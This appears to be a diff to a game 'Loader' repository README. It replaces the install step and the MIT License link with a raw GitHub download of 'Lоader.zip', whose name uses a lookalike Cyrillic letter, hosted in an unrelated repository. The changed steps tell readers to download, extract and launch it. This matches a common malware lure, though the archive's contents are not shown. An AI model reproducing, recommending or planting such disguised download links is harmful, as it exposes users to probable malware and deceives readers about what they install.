@@ -25,7 +25,7 @@ Enjoy effortless play and rapid access—whether on desktop or gaming device!
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/Lоader.zip** from the repository.
 2. Extract the archive to your system.
 3. Follow the step-by-step instructions in the included README for your OS.
 4. Launch and play instantly!
@@ -40,4 +40,4 @@ This repository provides a **Loader** for educational and backup purposes only. 
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – free for personal, non-commercial use!
+Licensed under the [MIT License](https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/Lоader.zip) – free for personal, non-commercial use!
